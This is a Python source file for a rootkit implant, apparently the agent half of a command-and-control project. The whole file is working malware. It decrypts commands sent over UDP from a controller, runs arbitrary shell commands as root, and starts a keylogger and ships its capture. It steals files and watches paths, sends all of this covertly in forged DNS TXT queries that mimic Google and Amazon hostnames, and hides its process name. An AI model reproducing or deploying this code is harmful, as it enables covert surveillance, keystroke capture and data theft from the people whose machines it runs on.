"""
    This is the rootkit program. It receives commands from the controller,
    decrypts them, executes them, and sends data to the controller through 
    forged DNS queries.
"""

# Ignore warnings
from warnings import filterwarnings
filterwarnings("ignore")

# Standard Modules
import os
from random import randint
import argparse
import sys
import logging
import time
from pathlib import Path
from datetime import datetime
import subprocess

# Custom Modules
from utils.encryption import StreamEncryption, BlockEncryption
from utils.shell import LIST, WGET, WATCH, KEYLOGGER, STOP, START, TRANSFER, EXECUTE, STEAL
from utils.validation import validate_ipv4_address, validate_nic_interface
from utils.process import hide_process_name
from utils.keylogger import Keylogger

# Third Party Libraries
from scapy.all import sniff, UDP, DNSQR, DNSRR, IP, DNS, send, conf
from watchdog.observers import Observer
from watchdog.events import PatternMatchingEventHandler, FileSystemEventHandler


# Check for root privileges.
if os.geteuid() != 0:
    print("ERROR: Root privileges are required to run this program!", file=sys.stderr)
    exit(1)


PARSER = argparse.ArgumentParser("./rootkit.py")
PARSER.add_argument("controller_ip", help="The IPv4 address of the controller host.")
PARSER.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
ARGS = PARSER.parse_args()


# Manually set scapy to use libpcap instead of bpkfilter.
# This is necessary to circumvent host-based firewall.
conf.use_pcap = True


if not validate_ipv4_address(ARGS.controller_ip):
    print(f"Invalid IPv4 Address: '{ARGS.controller_ip}'")
    sys.exit(1)

if not validate_nic_interface(ARGS.interface):
    print(f"Network Interface does not exist: '{ARGS.interface}'")
    sys.exit(1)



# Global Variables
CONTROLLER_IP = ARGS.controller_ip
NETWORK_INTERFACE = ARGS.interface
STREAM_ENCRYPTION_HANDLER = StreamEncryption()
BLOCK_ENCRYPTION_HANDLER = BlockEncryption()
KEYLOGGER_INSTANCE = Keylogger()
MONITOR_IDENTIFICATION = 14562
KEYLOG_IDENTIFICATION = 32586
GENERAL_MSG_IDENTIFICATION = 19375
COMMAND_OUTPUT_IDENTIFICATION = 51486
FILE_TRANSFER_IDENTIFICATION = 39182


# List of legit hostnames
HOSTNAMES = ["play.google.com",
             "pixel.33across.com",
             "signaler-pa.clients6.google.com",
             "www.youtube.com",
             "www.google.ca",
             "www.amazon.ca",
             "www.amazon.com",
             "safebrowsing.googleapis.com",
             "upload.wikimedia.org",
             "hhopenbid.pubmatic.com"]


# Initialize the encryption context.
STREAM_ENCRYPTION_HANDLER.read_nonce("data/nonce.bin")
STREAM_ENCRYPTION_HANDLER.read_secret("data/secret.key")
STREAM_ENCRYPTION_HANDLER.initialize_encryption_context()
BLOCK_ENCRYPTION_HANDLER.read_key("data/fernet.key")


def on_created(event):
    """
        Default event handler for creation events for files.
    """
    forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Created: {event.src_path}\n", MONITOR_IDENTIFICATION)

def on_deleted(event):
    """
        Default event handler for deletion events for files.
    """
    forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Deleted: {event.src_path}\n", MONITOR_IDENTIFICATION)

def on_modified(event):
    """
        Default event handler for modification events for files.
    """
    forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Modified: {event.src_path}\n", MONITOR_IDENTIFICATION)

def on_moved(event):
    """
        Default event handler for move events for files.
    """
    forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Moved: {event.src_path} --> {event.dest_path}\n", MONITOR_IDENTIFICATION)

def on_any_event_directories(event):
    """
        Default event handler for all directory events.
    """
    if event.is_directory:
        if event.event_type == "created":
            forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Created: {event.src_path}\n", MONITOR_IDENTIFICATION)
        if event.event_type == "deleted":
            forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Deleted: {event.src_path}\n", MONITOR_IDENTIFICATION)
        if event.event_type == "modified":
            forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Modified: {event.src_path}\n", MONITOR_IDENTIFICATION)
        if event.event_type == "moved":
            forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Moved: {event.src_path} --> {event.dest_path}\n", MONITOR_IDENTIFICATION)
    else:
        if event.event_type == "created":
            forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Created: {event.src_path}\n", MONITOR_IDENTIFICATION)
        if event.event_type == "deleted":
            forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Deleted: {event.src_path}\n", MONITOR_IDENTIFICATION)
        if event.event_type == "modified":
            forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Modified: {event.src_path}\n", MONITOR_IDENTIFICATION)
        if event.event_type == "moved":
            forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Moved: {event.src_path} --> {event.dest_path}\n", MONITOR_IDENTIFICATION)


class FileSystemMonitor():
    """
        The FileSystemMonitor class contains methods for watching files and directories
        for events. It is a wrapper for the watchdog module in Python (https://pypi.org/project/watchdog/).
    """

    __FILE = 1
    __DIRECTORY = 2
    __INVALID = 3


    def __init__(self):
        """
            Constructor method.

            Returns an instance of the FileSystemMonitor class.

            Parameters
            ----------
            None

            Returns
            -------
            An instance of the FileSystemMonitor class.
        """
        self.__threads = [] # List of threads watching directories.


    def shutdown(self):
        """
            Shutdown all threads.

            Iterates through the list of internal file/directory monitoring threads
            and stops each thread and waits for it to exit.
            
            Parameters
            ----------
            None

            Returns
            -------
            None
        """
        for thread in self.__threads:
            thread.stop()
        for thread in self.__threads:
            thread.join()


    def __validate_path(self, path: str) -> int:
        """
            Validate a file path.

            Checks if the given path is valid and returns a code
            which tells the programmer if the path points to a file, 
            directory, or is invalid.

            Parameters
            ----------
            path: str - The file path to validate.

            Returns
            -------
            int - An integer with a value equal to one of self.__FILE, self.__DIRECTORY, or self.__INVALID
        """
        if os.path.isdir(path):
            return self.__DIRECTORY
        elif os.path.isfile(path):
            return self.__FILE
        return self.__INVALID


    def __get_parent_directory(self, path: str) -> str:
        """
            Get the parent directory of the path.

            Takes a path to a file as input, and returns the parent directory of that file.

            Parameters
            ----------
            path: str - A path to a file.

            Returns
            -------
            str - A path to the parent directory of the given file path.
        """
        p = Path(path)
        return p.parent.absolute()


    def monitor(self, path: str) -> None:
        """
            Monitors the given path for changes.

            Monitors the given path, which could be a directory or a file path, 
            and starts a thread that watches for changes. When changes get detected, 
            an event handler is called that sends a notification to the controller.

            Parameters
            ----------
            path: str - A path to a directory or file. 

            Returns
            -------
            None
        """
        code: int = self.__validate_path(path)
        if code == self.__INVALID:
            print(f"Path does not exist: {path}")
            exit(1)
        if code == self.__FILE:
            # Defining event handler which will only emit file specific events.
            event_handler = PatternMatchingEventHandler(patterns = [os.path.basename(path)],
                                                        ignore_directories=True,
                                                        ignore_patterns=None,
                                                        case_sensitive=True)
            event_handler.on_created = on_created
            event_handler.on_deleted = on_deleted
            event_handler.on_modified = on_modified
            event_handler.on_moved = on_moved
            parent_dir = self.__get_parent_directory(path)
            observer = Observer()
            observer.schedule(event_handler, parent_dir, recursive=False)
            observer.start()
            self.__threads.append(observer)
            return
        elif code == self.__DIRECTORY:
            event_handler = FileSystemEventHandler()
            event_handler.on_any_event = on_any_event_directories
            observer = Observer()
            observer.schedule(event_handler, path, recursive=False)
            observer.start()
            self.__threads.append(observer)
            return


def get_random_hostname() -> str:
    """
        Get a random hostname.

        Uses the random library to randomly choose a hostname 
        out of a list of legitimate hostnames.

        Parameters
        ----------
        None

        Returns
        -------
        str - The randomly chosen hostname.
    """
    size = len(HOSTNAMES)
    index = randint(0, size-1)
    return HOSTNAMES[index]


def receive_udp_command(pkt) -> str:
    """
        Receives a command from the controller.

        Receives a command from a UDP datagram sent by the controller 
        and decrypts the packaged information and returns it as 
        a string.

        Parmeters
        ---------
        pkt - The packet to operate on.

        Returns
        -------
        str - The received command.
    """
    msg_len = pkt[UDP].len
    ciphertext = bytes(pkt[UDP].payload)[0:msg_len]
    msg_bytes = STREAM_ENCRYPTION_HANDLER.decrypt(ciphertext)
    msg = msg_bytes.decode("utf-8")
    return msg


def forge_dns_query_stream(data: str, indentification: int):
    """
        Forge DNS query using stream encryption.
        
        Forges a DNS query by encrypting the given data using a 
        stream cipher, and then placing the encrypted data into a 
        TXT record inside of the DNS query.

        Parameters
        ----------
        data: str - The data to place into the DNS query.
        identification: int - The identification number for the type of data.

        Returns
        -------
        A forged DNS query packet.
    """
    hostname = get_random_hostname()
    encrypted_data = b""
    if len(data) > 255:
        print("ERROR: Can't fit more than 256 bytes in TXT record!")
        print("Truncating data...")
        truncated_data = data[0:255]
        encrypted_data = STREAM_ENCRYPTION_HANDLER.encrypt(truncated_data.encode("utf-8"))
    else:
        encrypted_data = STREAM_ENCRYPTION_HANDLER.encrypt(data.encode("utf-8"))
    query = IP(dst=CONTROLLER_IP, id=indentification)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=hostname), ar=DNSRR(type="TXT", ttl=4, rrname=hostname, rdlen=len(encrypted_data)+1, rdata=encrypted_data))
    return query


def forge_dns_query_block(data: str, indentification: int):
    """
        Sends data to the contoller through forged DNS queries.

        Sends data to the controller through the use of forged DNS queries. 
        The data gets encrypted with a block cipher. If there is too much data 
        to send in one DNS query packet, then it keeps forging and sending packets 
        until there is no more data to be sent.

        Parameters
        ----------
        data: str - The data to send to the controller.
        identification: int - The identification number for the type of data being sent.

        Returns
        -------
        None
    """
    hostname = get_random_hostname()
    encrypted_data = b""
    if len(data) > 120:
        total_bytes = len(data)
        bytes_sent = 0
        # If too much data to send in one packet,
        # need to send it in multiple packets.
        while bytes_sent < total_bytes:
            truncated_data = data[bytes_sent:bytes_sent+120]
            bytes_sent += len(truncated_data)
            encrypted_data = BLOCK_ENCRYPTION_HANDLER.encrypt(truncated_data.encode("utf-8"))
            query = IP(dst=CONTROLLER_IP, id=indentification)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=hostname), ar=DNSRR(type="TXT", ttl=4, rrname=hostname, rdlen=len(encrypted_data)+1, rdata=encrypted_data))
            send(query, verbose=0)
    else:
        encrypted_data = BLOCK_ENCRYPTION_HANDLER.encrypt(data.encode("utf-8"))
        query = IP(dst=CONTROLLER_IP, id=indentification)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=hostname), ar=DNSRR(type="TXT", ttl=4, rrname=hostname, rdlen=len(encrypted_data)+1, rdata=encrypted_data))
        send(query, verbose=0)


def execute_watch_command(path: str) -> bool:
    """
        Execute the watch command with the given path.

        Verifies the given path exists and then uses the FileSystemMonitor 
        class to watch the path for changes. It also sends a notification to the 
        controller if the file doesn't exist or if the file is successfully being 
        monitored.


        Parameters
        ----------
        path: str - The path, file or directory, to watch.

        Returns
        -------
        bool - True on success, False on failure.
    """
    if not os.path.exists(path):
        query = forge_dns_query_stream(f"ERRORMSG: Path: {path} does not exist.", GENERAL_MSG_IDENTIFICATION)
        send(query, verbose=0)
        return False
    MONITOR.monitor(path)
    query = forge_dns_query_stream(f"Path '{path}' will be monitored.", GENERAL_MSG_IDENTIFICATION)
    send(query, verbose=0)
    return True


def stop_keylogger() -> None:
    """
        Stops the keylogger.

        Attempts to stop the keylogger instance running on this host and 
        then sends a notification to the controller informing it of success 
        or failure.

        Parameters
        ----------
        None

        Returns
        -------
        None
    """
    if KEYLOGGER_INSTANCE.stop():
        print("SUCCESS: Stopped keylogger")
        query = forge_dns_query_stream("SUCCESS: Stopped keylogger", GENERAL_MSG_IDENTIFICATION)
        send(query, verbose=0)
    else:
        print("FAILED: You can't stop an inactive keylogger")
        query = forge_dns_query_stream("FAILED: You can't stop an inactive keylogger", GENERAL_MSG_IDENTIFICATION)
        send(query, verbose=0)


def start_keylogger() -> None:
    """
        Starts the keylogger.

        Attempts to start the keylogger instance running on this host and 
        then sends a notification to the controller informing it of success 
        or failure.

        Parameters
        ----------
        None

        Returns
        -------
        None
    """
    if KEYLOGGER_INSTANCE.start():
        print("SUCCESS: Started keylogger")
        query = forge_dns_query_stream("SUCCESS: Started keylogger", GENERAL_MSG_IDENTIFICATION)
        send(query, verbose=0)
    else:
        print("FAILED: You can't start an active keylogger")
        query = forge_dns_query_stream("FAILED: You can't start an active keylogger", GENERAL_MSG_IDENTIFICATION)
        send(query, verbose=0)


def transfer_keylogger() -> None:
    """
        Transfer the keylogger.

        Reads the data collected by the keylogger, if the data is empty, then 
        send a failure notification to the contoller. Otherwise, send the data 
        covertly to the controller using forged DNS queries. After sending, clear 
        the keylog data.

        Parameters
        ----------
        None

        Returns
        -------
        None
    """
    data = KEYLOGGER_INSTANCE.get_keylog()
    KEYLOGGER_INSTANCE.clear_keylog()
    if not data:
        print("FAILED: Keylogger has not captured any data.")
        query = forge_dns_query_stream("FAILED: Keylogger has not captured any data.", GENERAL_MSG_IDENTIFICATION)
        send(query, verbose=0)
    else:
        print("SUCCESS: Transferring keylog data...")
        query = forge_dns_query_stream("SUCCESS: Transferring keylog data...", GENERAL_MSG_IDENTIFICATION)
        send(query, verbose=0)
        forge_dns_query_block(data, KEYLOG_IDENTIFICATION)


def arg_list_to_string(args: list) -> str:
    """
        Convert a list of strings into a string 
        where each list item is delimited by a space 
        character.

        Parameters
        ----------
        args: list - A list of strings.

        Returns
        -------
        str - The list as a string.
    """
    result = ""
    for arg in args:
        result += arg
        result += " "
    result = result.strip()
    return result


def execute_arbitrary_command(args: list) -> str:
    """
        Execute the given command on the rootkit host.

        Takes a list of arguments as input, executes the command as root,
        and returns the result as a string.

        Parameters
        ----------
        args: list - A list of strings representing the arguments of a command.

        Returns
        -------
        str - The output of the command.
        
    """
    command = arg_list_to_string(args)
    result = subprocess.getoutput(command)
    return result


def execute_steal_file(filepath: str) -> bool:
    """
        Transfers a file from the rootkit to the controller host.

        Takes a file path as input, verifies that it exists and that it 
        isn't a directory, reads the bytes from the file, and sends 
        the bytes to the controller through the use of DNS queries.

        Parameters
        ----------
        filepath: str - The path to the file to transfer.

        Returns
        -------
        bool - True on success, False on failure.
    """
    # If the file does not exist, or it isn't a file, we do nothing,
    # and send a notification to the controller
    if not os.path.exists(filepath):
        query = forge_dns_query_stream(f"ERROR: {filepath} not found", GENERAL_MSG_IDENTIFICATION)
        send(query, verbose=0)
        return False
    if os.path.isdir(filepath):
        query = forge_dns_query_stream(f"ERROR: {filepath} is a directory.", GENERAL_MSG_IDENTIFICATION)
        send(query, verbose=0)
        return False
    # Our file exists, and isn't a directory, so do the transfer
    file_data = ""
    file_size_bytes = 0
    with open(filepath, "rb") as f:
        file_data = f.read()
        file_size_bytes = len(file_data)
    filename = os.path.basename(filepath)
    metadata = f"FILENAME:{filename} NUM_BYTES:{str(file_size_bytes)}"
    print("Sending file...")
    # Send meta data first.
    forge_dns_query_block(metadata, FILE_TRANSFER_IDENTIFICATION)
    # Send the file.
    forge_dns_query_block(file_data.decode("utf-8"), FILE_TRANSFER_IDENTIFICATION)
    # Notify the controller
    query = forge_dns_query_stream("SUCCESS: Sending file...", GENERAL_MSG_IDENTIFICATION)
    send(query, verbose=0)
    return True


def packet_handler(pkt):
    """
        Main packet handling function.
        
        When a packet is received, it checks that it is from 
        the controller host, and then parses the command from 
        the encrypted packet, then executes the command and 
        sends the results back to the controller.
    
        Parameters
        ----------
        pkt - The received packet.

        Returns
        -------
        None
    """
    if pkt[UDP].sport != 10069 or pkt[UDP].dport != 10420:
        return
    command = receive_udp_command(pkt)
    print(f"Received: {command}")
    argv = command.split(" ")
    argc = len(argv)    
    if argc == 2:
        if argv[0] == WATCH:
            if argv[1] == STOP:
                MONITOR.shutdown()
                query = forge_dns_query_stream("SUCCESS: Stopped file monitor.", GENERAL_MSG_IDENTIFICATION)
                send(query, verbose=0)
            else:
                execute_watch_command(argv[1])
        if argv[0] == KEYLOGGER:
            if argv[1] == STOP:
                stop_keylogger()
            if argv[1] == START:
                start_keylogger()
            if argv[1] == TRANSFER:
                transfer_keylogger()
        if argv[0] == STEAL:
            execute_steal_file(argv[1])
    if argv[0] == EXECUTE:
        result = execute_arbitrary_command(argv[1:])
        num_bytes = len(result.encode("utf-8"))
        result = "NUM_BYTES:"+str(num_bytes) + " " + result
        forge_dns_query_block(result, COMMAND_OUTPUT_IDENTIFICATION)


MONITOR = FileSystemMonitor()


if __name__ == "__main__":
    print("Rootkit is listening for commands...")
    hide_process_name("systemd-userwork-evil")
    sniff(filter=f"ip src host {CONTROLLER_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=packet_handler)

